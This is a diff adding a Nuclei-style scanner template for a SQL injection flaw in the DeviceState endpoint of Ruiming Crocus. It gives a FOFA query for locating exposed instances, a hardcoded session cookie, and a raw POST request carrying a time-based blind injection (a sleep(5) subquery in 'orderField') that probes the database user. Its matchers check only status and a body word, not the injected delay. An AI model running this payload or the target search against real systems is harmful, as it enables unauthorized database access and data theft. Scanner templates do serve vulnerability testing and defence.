@@ -1,0 +1,28 @@
+id: ruiming-crocus-devicestate-sqli
+
+info:
+  name: 锐明 Crocus DeviceState 接口 SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")
+      该组件在处理DeviceState接口参数时未正确过滤特殊字符，攻击者可通过构造恶意SQL语句实现数据库敏感信息泄露。漏洞利用可能导致任意查询执行、数据篡改及权限提升，影响系统数据完整性与机密性。
+  tags: 锐明
+
+http:
+- raw:
+  - |
+    POST /DeviceState.do?Action=Query HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
+    Content-Type: application/x-www-form-urlencoded
+
+    EndTime=2025-12-20+00%3A00%3A00&PageIndex=0&PageSize=1&RepairState=-1&StartTime=2025-08-26+00%3A00%3A00&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)&orderType=asc
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'speed'
